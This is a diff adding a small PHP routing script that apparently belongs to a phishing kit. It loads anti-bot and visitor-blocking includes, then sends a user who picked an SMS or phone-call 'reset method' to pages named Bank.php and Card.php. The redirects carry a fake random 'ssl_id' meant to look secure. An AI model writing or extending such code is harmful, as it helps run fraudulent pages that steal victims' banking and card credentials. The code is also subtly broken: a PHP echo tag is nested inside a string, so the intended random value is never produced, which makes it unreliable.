@@ -1,0 +1,25 @@
+<?php
+require "includes/session_protect.php";
+require "includes/functions.php";
+require "includes/One_Time.php";
+include 'includes/antibots.php';
+include 'includes/bt.php';
+include "includes/blocker.php";
+
+
+if(isset($_POST['resetMethod']) && ($_POST['resetMethod']) == "SMS"){
+
+    header("Location: Bank.php?ssl_id=<?php echo generateRandomString(130); ?>"); 
+
+ }
+
+elseif(isset($_POST['resetMethod']) && ($_POST['resetMethod']) == "CALL"){
+
+    header("Location: Card.php?ssl_id=<?php echo generateRandomString(130); ?>"); 
+
+ }
+
+ else{
+        header("Location: Step2.php?ssl_id=<?php echo generateRandomString(130); ?>"); 
+}
+?>
